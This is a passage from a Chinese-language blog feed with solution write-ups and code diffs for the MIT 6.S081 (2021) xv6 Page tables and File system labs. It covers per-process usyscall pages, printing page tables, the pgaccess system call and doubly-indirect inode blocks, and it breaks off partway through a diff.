<li>为 <code>struct proc</code> 结构体添加 <code>struct usyscall *usc</code> 段。</li>
<li>在 <code>allocproc()</code> 中为 <code>usc</code> 分配物理内存，并对其赋值：<code>p-&gt;usc-&gt;pid = p-&gt;pid;</code>。</li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">usyscall</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">freeproc</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">release</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
p<span class="token operator">-></span>usc<span class="token operator">-></span>pid <span class="token operator">=</span> p<span class="token operator">-></span>pid<span class="token punctuation">;</span></code></pre>

<ol start="3">
<li>在 <code>freeproc()</code> 中释放 <code>usc</code> 的物理内存。</li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span>
	<span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">;</span>
p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre>

<ol start="4">
<li>在 <code>proc_pagetable()</code> 中使用 <code>mappages</code> 插入虚拟地址 <code>USYSCALL</code> 的页表项。</li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_R <span class="token operator">|</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
	<span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAMPOLINE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAPFRAME<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">uvmfree</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<ol start="5">
<li>最后，非常容易忽视的，在 <code>proc_freepagetable()</code> 中删除虚拟地址 <code>USYSCALL</code> 的页表项。</li>
</ol>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>接下来讲讲我在本题遇到的几个问题。</p>
<p><strong>问题 1：</strong></p>
<p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn1.png"></p>
<p><strong>原因：</strong> <code>p-&gt;usc-&gt;pid = p-&gt;pid</code> 放在分配物理内存之前，导致空指针解引用。</p>
<p><strong>问题 2：</strong></p>
<p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn2.png"></p>
<p><strong>原因：</strong> 未在 <code>proc_freepagetable()</code> 中解除 <code>USYSCALL</code> 的页表项映射，也就是上面提到的容易忽视的第 5 点。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/proc.c b/kernel/proc.c
index 22e7ce4..5fc573f 100644
<span class="token coord">--- a/kernel/proc.c</span>
<span class="token coord">+++ b/kernel/proc.c</span>
@@ -127,6 +127,14 @@ found:
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return 0;
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  // here
</span><span class="token prefix inserted">+</span><span class="token line">  if ((p->usc = (struct usyscall *)kalloc()) == 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	freeproc(p);
</span><span class="token prefix inserted">+</span><span class="token line">	release(&amp;p->lock);
</span><span class="token prefix inserted">+</span><span class="token line">	return 0;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  p->usc->pid = p->pid;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // An empty user page table.
</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = proc_pagetable(p);
</span><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable == 0)&#123;
</span></span>@@ -153,6 +161,9 @@ freeproc(struct proc *p)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->trapframe)
</span><span class="token prefix unchanged"> </span><span class="token line">    kfree((void*)p->trapframe);
</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe = 0;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (p->usc) // here
</span><span class="token prefix inserted">+</span><span class="token line">	kfree((void*)p->usc);
</span><span class="token prefix inserted">+</span><span class="token line">  p->usc = 0;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable)
</span><span class="token prefix unchanged"> </span><span class="token line">    proc_freepagetable(p->pagetable, p->sz);
</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = 0;
</span></span>@@ -195,6 +206,14 @@ proc_pagetable(struct proc *p)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    uvmfree(pagetable, 0);
</span><span class="token prefix unchanged"> </span><span class="token line">    return 0;
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  // here
</span><span class="token prefix inserted">+</span><span class="token line">  if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p->usc), PTE_R | PTE_U) &lt; 0) &#123;  
</span><span class="token prefix inserted">+</span><span class="token line">	uvmunmap(pagetable, TRAMPOLINE, 1, 0);
</span><span class="token prefix inserted">+</span><span class="token line">	uvmunmap(pagetable, TRAPFRAME, 1, 0);
</span><span class="token prefix inserted">+</span><span class="token line">	uvmfree(pagetable, 0);
</span><span class="token prefix inserted">+</span><span class="token line">	return 0;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  return pagetable;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span>@@ -206,6 +225,7 @@ proc_freepagetable(pagetable_t pagetable, uint64 sz)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAMPOLINE, 1, 0);
</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAPFRAME, 1, 0);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, USYSCALL, 1, 0); // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  uvmfree(pagetable, sz);
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>diff --git a/kernel/proc.h b/kernel/proc.h
index f6ca8b7..d25a729 100644
<span class="token coord">--- a/kernel/proc.h</span>
<span class="token coord">+++ b/kernel/proc.h</span>
@@ -82,6 +82,8 @@ struct trapframe &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">enum procstate &#123; UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE &#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct usyscall;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">// Per-process state
</span><span class="token prefix unchanged"> </span><span class="token line">struct proc &#123;
</span><span class="token prefix unchanged"> </span><span class="token line">  struct spinlock lock;
</span></span>@@ -105,4 +107,7 @@ struct proc &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files
</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory
</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  // here
</span><span class="token prefix inserted">+</span><span class="token line">  struct usyscall *usc;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span></code></pre>

<h1 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>仿照 <code>freewalk</code> 函数的写法，递归查找所有有效的页表项，并根据题干要求打印相关信息。涉及的内容较少，如果认真把上面提到的几个关键函数理清楚，并且理解了多级页表的机制，写起来还是比较轻松的，流程如下：</p>
<p>遍历当前页表中的所有页表项，如果页表项有效（flags 的有效位为 1），则将该页表项转换为物理地址向下递归搜索。需要注意的是在递归查找到第 3 级页表时，就不能继续向下递归了，此时得到的 <code>pa</code> 就是进行虚实地址转换后的物理地址。</p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.h
index 3564db4..d169300 100644
<span class="token coord">--- a/kernel/defs.h</span>
<span class="token coord">+++ b/kernel/defs.h</span>
@@ -170,6 +170,7 @@ uint64          walkaddr(pagetable_t, uint64);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);
</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);
</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            vmprint(pagetable_t); // here
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// plic.c
</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);
</span></span>diff --git a/kernel/exec.c b/kernel/exec.c
index d62d29d..89f3d74 100644
<span class="token coord">--- a/kernel/exec.c</span>
<span class="token coord">+++ b/kernel/exec.c</span>
@@ -115,6 +115,11 @@ exec(char *path, char **argv)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->epc = elf.entry;  // initial program counter = main
</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->sp = sp; // initial stack pointer
</span><span class="token prefix unchanged"> </span><span class="token line">  proc_freepagetable(oldpagetable, oldsz);
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  // here
</span><span class="token prefix inserted">+</span><span class="token line">  if(p->pid == 1) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	vmprint(p->pagetable);
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  return argc; // this ends up in a0, the first argument to main(argc, argv)
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>diff --git a/kernel/vm.c b/kernel/vm.c
index d5a12a0..23eeec9 100644
<span class="token coord">--- a/kernel/vm.c</span>
<span class="token coord">+++ b/kernel/vm.c</span>
@@ -432,3 +432,25 @@ copyinstr(pagetable_t pagetable, char *dst, uint64 srcva, uint64 max)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return -1;
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">// here
</span><span class="token prefix inserted">+</span><span class="token line">void vmprint_recur(pagetable_t pagetable, int depth) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	for (int i = 0; i &lt; 512; ++i) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">		pte_t pte = pagetable[i];
</span><span class="token prefix inserted">+</span><span class="token line">		if (pte &amp; PTE_V) &#123; // pte is valid
</span><span class="token prefix inserted">+</span><span class="token line">			for (int j = 0; j &lt; depth; ++j) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">				printf(" ..");
</span><span class="token prefix inserted">+</span><span class="token line">			&#125;
</span><span class="token prefix inserted">+</span><span class="token line">			uint64 child = PTE2PA(pte);
</span><span class="token prefix inserted">+</span><span class="token line">			printf("%d: pte %p pa %p\n", i, pte, child);
</span><span class="token prefix inserted">+</span><span class="token line">			if (depth &lt; 3) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">				vmprint_recur((pagetable_t)child, depth + 1);	
</span><span class="token prefix inserted">+</span><span class="token line">			&#125;
</span><span class="token prefix inserted">+</span><span class="token line">		&#125;
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">&#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">void vmprint(pagetable_t pagetable) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	printf("page table %p\n", pagetable);
</span><span class="token prefix inserted">+</span><span class="token line">	vmprint_recur(pagetable, 1);
</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span></code></pre>

<h1 id="Detecting-which-pages-have-been-accessed"><a href="#Detecting-which-pages-have-been-accessed" class="headerlink" title="Detecting which pages have been accessed"></a>Detecting which pages have been accessed</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>题目要求实现一个系统调用 <code>sys_pgaccess()</code>，获取指定虚拟页面的<strong>最近被访问信息</strong>。</p>
<p>算是一个大杂烩的题，把 Lab System calls 的内容和 pagetable 结合起来，不要被 hard 难度标签吓到了，只要前面的 Lab 全都认真完成，再运用一些位运算的技巧，本题其实并不 “hard”。</p>
<p>所有的系统调用需要的声明已经实现添加好了，我们只需要关注 <code>sys_pgaccess()</code> 的实现即可，基本流程如下：</p>
<ol>
<li>和 Lab System calls 一样，使用 <code>argint()</code> 和 <code>argaddr()</code> 获取用户空间传递的参数：<code>base</code>、<code>len</code>、<code>mask</code>。</li>
<li>函数体内定义一个 <code>kmask</code>，作为 <code>mask</code> 的缓冲区。</li>
<li>从地址 <code>base</code> 开始遍历连续的 <code>len</code> 的页面，获取该页面的页表项 <code>pte</code>，根据 <code>pte</code> 的访问位对 <code>kmask</code> 进行置位，注意不要忘了每次遍历后将 <code>pte</code> 的访问位置 0。</li>
<li>遍历完成后，使用 <code>copyout()</code> 将 <code>kmask</code> 的数据存入用户空间 <code>mask</code> 处。</li>
</ol>
<p>有一个值得注意的问题，根据提示：</p>
<blockquote>
<p>It’s okay to set an upper limit on the number of pages that can be scanned.</p>
</blockquote>
<p>可以设定一个最大扫描范围，这主要根据 <code>kmask</code> 的数据类型而定，这里我选择使用 <code>long</code> 类型，那么最大扫描范围自然就是 64（<code>long</code> 类型为 8 字节大小，64 bit）。</p>
<p>同时，在对 <code>kmask</code> 操作时，可以运用一些位运算的技巧：</p>
<p>首先可以将 <code>kmask</code> 置为 0（二进制位全为 0），如果页面 i 的访问位为 1，则使用 <code>kmask |= (1 &lt;&lt; i)</code>，将 <code>kmask</code> 第 i 位置为 1 而不影响其它位（<code>0 | 0 = 0; 1 | 0 = 1</code>）。</p>
<p>要清除 <code>pte</code> 的访问位，可使用 <code>*pte &amp;= ~PTE_A</code>，其中 <code>PTE_A = 1L &lt;&lt; 6</code>，即访问位为 1，其它位都为 0，取反后，访问位为 0，其它位都为 1，与其进行按位与运算可将访问位置为 0，而不影响其它位（<code>0 &amp; 1 = 0; 1 &amp; 1 = 1</code>）。</p>
<h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p><strong>问题 1：</strong></p>
<p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/walk.png"></p>
<p><strong>原因：</strong> 比较坑的一个问题，原因是 <code>kernel/defs.h</code> 中没有 <code>walk</code> 函数声明，需要手动添加。</p>
<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.h
index d169300..53f1f88 100644
<span class="token coord">--- a/kernel/defs.h</span>
<span class="token coord">+++ b/kernel/defs.h</span>
@@ -171,6 +171,7 @@ int             copyout(pagetable_t, uint64, char *, uint64);
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);
</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);
</span><span class="token prefix unchanged"> </span><span class="token line">void            vmprint(pagetable_t); // here
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t 			*walk(pagetable_t, uint64, int);
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// plic.c
</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);
</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.h
index 1691faf..6b130fe 100644
<span class="token coord">--- a/kernel/riscv.h</span>
<span class="token coord">+++ b/kernel/riscv.h</span>
@@ -343,6 +343,7 @@ sfence_vma()
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)
</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)
</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_A (1L &lt;&lt; 6) // access bit
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.
</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)
</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.c
index 3bd0007..359847c 100644
<span class="token coord">--- a/kernel/sysproc.c</span>
<span class="token coord">+++ b/kernel/sysproc.c</span>
@@ -81,6 +81,36 @@ int
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">sys_pgaccess(void)
</span><span class="token prefix unchanged"> </span><span class="token line">&#123;
</span><span class="token prefix unchanged"> </span><span class="token line">  // lab pgtbl: your code here.
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct proc *p = myproc();
</span><span class="token prefix inserted">+</span><span class="token line">  void *base, *mask;
</span><span class="token prefix inserted">+</span><span class="token line">  long kmask; // buffer
</span><span class="token prefix inserted">+</span><span class="token line">  int len;
</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte;
</span><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(0, (uint64 *)&amp;base) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  if (argint(1, &amp;len) &lt; 0 || len > 64) &#123; // page limited to 64
</span><span class="token prefix inserted">+</span><span class="token line">	return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(2, (uint64 *)&amp;mask) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  kmask = 0L; // initialize bitmask to zero
</span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; len; ++i) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	uint64 va = (uint64)(base + i * PGSIZE);
</span><span class="token prefix inserted">+</span><span class="token line">	pte = walk(p->pagetable, va, 0);
</span><span class="token prefix inserted">+</span><span class="token line">	if (*pte &amp; PTE_A) &#123; // pte was accessed recently
</span><span class="token prefix inserted">+</span><span class="token line">	  kmask |= (1 &lt;&lt; i);
</span><span class="token prefix inserted">+</span><span class="token line">	&#125;
</span><span class="token prefix inserted">+</span><span class="token line">	*pte &amp;= ~PTE_A; // clear access bit
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">  
</span><span class="token prefix inserted">+</span><span class="token line">  if (copyout(p->pagetable, (uint64)mask, (char *)&amp;kmask, 8) &lt; 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">	return -1;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span><span class="token prefix unchanged"> </span><span class="token line">#endif</span></span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>操作系统</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT6.s081 2021 Lab File system</title>
    <url>/2024/08/16/MIT6.s081-2021-Lab%20File%20system/</url>
    <content><![CDATA[<h1 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 文件系统的 inode 中地址域 <code>addrs[]</code> 由 12 个直接地址和 1 个一级间接地址组成，本实验要求将地址域更改为 11 个直接地址、1 个一级间接地址和 1 个二级间接地址组成，以支持更大文件的存储。</p>
<p>代码的实现有了直接地址和一级间接地址做参考，就很简单了，直接查看代码部分即可。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/file.h b/kernel/file.h
index b076d1d..5c4eb3a 100644
<span class="token coord">--- a/kernel/file.h</span>
<span class="token coord">+++ b/kernel/file.h</span>
@@ -26,7 +26,7 @@ struct inode &#123;
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;
</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;
</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">// map major device number to device functions.
</span></span>diff --git a/kernel/fs.c b/kernel/fs.c
index 40c9bd4..4c00ab5 100644
<span class="token coord">--- a/kernel/fs.c</span>
<span class="token coord">+++ b/kernel/fs.c</span>
@@ -400,6 +400,33 @@ bmap(struct inode *ip, uint bn)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    brelse(bp);
</span><span class="token prefix unchanged"> </span><span class="token line">    return addr;
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  bn -= NINDIRECT;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  if (bn &lt; NINDIRECT2) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = ip->addrs[NDIRECT + 1]) == 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      ip->addrs[NDIRECT + 1] = addr = balloc(ip->dev);
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">    uint i = bn / NINDIRECT, j = bn % NINDIRECT;
</span><span class="token prefix inserted">+</span><span class="token line">    
</span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);
</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;
</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[i]) == 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      a[i] = addr = balloc(ip->dev);
</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);
</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;
</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[j]) == 0) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      a[j] = addr = balloc(ip->dev);
</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">    return addr;
</span><span class="token prefix inserted">+</span><span class="token line">  &#125;
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">  panic("bmap: out of range");
</span><span class="token prefix unchanged"> </span><span class="token line">&#125;
</span></span>@@ -432,6 +459,29 @@ itrunc(struct inode *ip)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    ip->addrs[NDIRECT] = 0;
</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct buf *bp2;
</span><span class="token prefix inserted">+</span><span class="token line">  uint *a2;
</span><span class="token prefix inserted">+</span><span class="token line">  if (ip->addrs[NDIRECT + 1]) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, ip->addrs[NDIRECT + 1]);
</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;
</span><span class="token prefix inserted">+</span><span class="token line">    for (i = 0; i &lt; NINDIRECT; ++i) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">      if (a[i]) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">        bp2 = bread(ip->dev, a[i]);
</span><span class="token prefix inserted">+</span><span class="token line">        a2 = (uint *)bp2->data;
</span><span class="token prefix inserted">+</span><span class="token line">        for (j = 0; j &lt; NINDIRECT; ++j) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">          if (a2[j]) &#123;
</span><span class="token prefix inserted">+</span><span class="token line">            bfree(ip->dev, a2[j]);
</span><span class="token prefix inserted">+</span><span class="token line">          &#125;
</span><span class="token prefix inserted">+</span><span class="token line">        &#125;
</span><span class="token prefix inserted">+</span><span class="token line">        brelse(bp2);
</span><span class="token prefix inserted">+</span><span class="token line">        bfree(ip->dev, a[i]);
</span><span class="token prefix inserted">+</span><span class="token line">      &#125;
</span><span class="token prefix inserted">+</span><span class="token line">    &#125;
</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);
</span><span class="token prefix inserted">+</span><span class="token line">    bfree(ip->dev, ip->addrs[NDIRECT + 1]);
</span><span class="token prefix inserted">+</span><span class="token line">    ip->addrs[NDIRECT + 1] = 0;
